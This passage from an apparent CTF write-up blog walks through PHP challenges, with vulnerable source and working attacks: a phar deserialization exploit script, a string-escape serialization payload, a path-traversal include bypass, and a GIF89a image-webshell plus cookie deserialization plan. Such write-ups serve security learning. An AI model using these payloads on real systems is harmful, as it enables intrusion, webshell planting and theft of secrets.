<li><p>所以,我们最后的利用链是,<code>User.__destruct-&gt;Filelist.__destruct-&gt;Filelist.__call-&gt;File.close()</code>.</p>
</li>
<li><p>exp.php are as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ini_set('phar.readonly',0);</span></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"glzjin"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>Finally , go to delete.php and read phar file.</p>
<p><img src="/home/ch4ser/.config/Typora/typora-user-images/1562476007031.png" alt="1562476007031"></p>
<h2 id="TCTF2016-piapiapia"><a href="#TCTF2016-piapiapia" class="headerlink" title="TCTF2016 piapiapia"></a>TCTF2016 piapiapia</h2><p>source code:</p>
<p>profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $profile=$user-&gt;show_profile($username);</span><br><span class="line">    <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">        header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// 反序列化漏洞</span></span><br><span class="line">        $profile = unserialize($profile);</span><br><span class="line"></span><br><span class="line">        $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">        $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">        $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="comment">// 如果我们可以控制photo这个变量,那么就可以打开任意文件了</span></span><br><span class="line">        $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 这里可以将nickname声明成一个数组来绕过限制</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">        $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">        <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">        $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">        $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">        $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="comment">// 变量photo要被处理 </span></span><br><span class="line">        $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">        $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">        $value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回选择的结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">            $config[<span class="string">'hostname'</span>],</span><br><span class="line">            $config[<span class="string">'username'</span>], </span><br><span class="line">            $config[<span class="string">'password'</span>]</span><br><span class="line">        );</span><br><span class="line">        mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ordinary sql query</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">        $key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">        $value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">        $sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);       <span class="comment">#\   \\ </span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="comment">// 'where' will be replaced by 'hacker',which leads to string length plus one for each replacement.</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">    $config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">    $config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">    $config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">    $flag = &apos;&apos;; // &lt;= flag is here and we need to read it.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>see <code>unserialize()</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511495-8ac41c80-aa29-11e9-9ffb-2e1889602ebb.png" alt="1562311707783"></p>
<p>As mentioned in source code, we can generate the payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/60750111-694d4480-9fd6-11e9-872e-aabff95d0aa9.png" alt="image"></p>
<p>After doing that, go to <code>profile.php</code>, which will show us a base64 code in its source code:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511543-aaf3db80-aa29-11e9-86a0-81b289e9d78a.png" alt="1562385121228"></p>
<h2 id="HTCF2018-warmup"><a href="#HTCF2018-warmup" class="headerlink" title="HTCF2018 warmup"></a>HTCF2018 warmup</h2><p>source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">	<span class="comment">// to include ffffllllaaaagggg</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">	    <span class="comment">// has to be string</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">// must be in whitelist</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">	    <span class="comment">// also must be in whitelist</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"if"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ifif"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>It is notable that <code>source.php?/</code> was regarded as a folder , though not exits, and we should jump out of it using a <code>../</code>.</p>
<h2 id="2019强网杯-upload"><a href="#2019强网杯-upload" class="headerlink" title="2019强网杯 upload"></a>2019强网杯 upload</h2><p>虽然名字叫做<code>upload</code> 但是更多偏重于代码审计，首先根据第二题的提示(????)，发现了一个<code>/www.tar.gz</code> ，解压之后打开是<code>thinkphp</code>源码，然后从官网中下载源码，对比发现在<code>application</code> 目录下面多了一个<code>web</code> 目录，里面有价值的文件有<code>Index.php</code> <code>Profile.php</code> <code>Login.php</code> <code>Register.php</code> ,然后。。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;<span class="comment">//因为最后我们不上传文件，所以跳过这段</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">........</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当访问不存在的属性的时候调用</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当访问不存在的方法的时候调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">	    <span class="comment">// 反序列化漏洞警告</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// 要用反序列化触发代码，需要申请的类应该就是register类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路：</p>
<ul>
<li>先上传图片马（改后缀名为png，上传失败，在php文件开头加上<code>GIF89a</code>之后再改成png文件就可以成功上传了)</li>
<li>上传用户cookie来触发反序列化漏洞，将之前上传的图片copy为php后缀名的文件<ul>
